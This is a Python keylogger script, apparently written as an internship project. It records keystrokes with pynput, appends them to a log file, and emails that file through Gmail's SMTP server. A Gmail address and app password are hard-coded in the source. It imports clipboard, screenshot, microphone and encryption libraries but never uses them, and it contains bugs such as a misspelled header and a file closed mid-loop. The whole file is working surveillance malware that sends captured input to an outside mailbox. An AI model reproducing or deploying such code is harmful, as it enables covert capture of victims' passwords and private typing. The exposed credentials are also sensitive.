# Libraries

from email.mime.multipart import MIMEMultipart
from  email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import  getpass
from requests import get

from multiprocessing import process , freeze_support
from PIL import ImageGrab

keys_information = "key_logs.txt"
email_address = "harshithsamudrala@gmail.com"
password = "vvvm ejpl rhib wkaa"
to_email_address = "harshithsamudrala@gmail.com"

file_path = "D:\\Cyber\\Infotact Internship\\Projret1\\.venv"
extend = "\\"

def send_email(filename, attachment, to_email_address):
    from_address = email_address
    msg = MIMEMultipart()
    msg['From']=from_address
    msg['To']=to_email_address
    msg['Subject']= "Log File"
    body = "Body of the email"
    msg.attach(MIMEText(body,'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octat-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header("Content-Dispotion", 'Attachment ; filename =%s'%filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(from_address,password)
    text = msg.as_string()
    s.sendmail(from_address,to_email_address,text)
    s.quit()

send_email(keys_information, file_path+extend+keys_information,to_email_address)

count = 0
keys = []

def on_press(key):
    global  keys , count
    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys=[]


def  write_file(keys):
    with open(file_path+extend+keys_information,'a') as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space")>0:
                f.write("\n")
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()

def on_relese(key):
    if key == Key.esc:
        return False

with Listener (on_press=on_press, on_release=on_relese) as Listener :
    Listener.join()